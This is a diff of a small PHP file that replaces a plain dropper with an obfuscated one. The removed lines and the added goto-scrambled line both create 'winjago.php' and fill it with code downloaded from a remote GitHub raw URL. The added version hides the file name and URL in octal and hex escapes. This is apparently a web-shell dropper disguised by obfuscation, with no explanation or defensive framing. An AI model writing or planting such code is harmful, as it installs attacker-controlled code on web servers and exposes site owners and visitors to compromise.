@@ -1,6 +1,2 @@
 <?php
-$make = fopen('winjago.php', 'w+');
-$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/lock-geek.php');
-fwrite($make, $get);
-fclose($make);
-?>
+goto NdN70; C_qcs: fwrite($NGRcT, $B81o8); goto jQmX_; NdN70: $NGRcT = fopen("\167\151\156\152\x61\x67\x6f\56\160\x68\x70", "\x77\53"); goto cUz2T; cUz2T: $B81o8 = file_get_contents("\150\164\164\160\163\x3a\57\x2f\162\141\167\56\x67\x69\x74\x68\165\142\165\x73\x65\162\143\157\156\164\x65\x6e\x74\56\x63\x6f\155\57\x7a\151\x76\x61\156\141\x6f\153\x74\x6f\162\141\57\x6c\157\x63\x6b\55\x67\145\x65\153\x2f\x6d\141\x69\156\x2f\x6c\x6f\x63\x6b\x2d\x67\145\145\x6b\56\160\x68\160"); goto C_qcs; jQmX_: fclose($NGRcT);
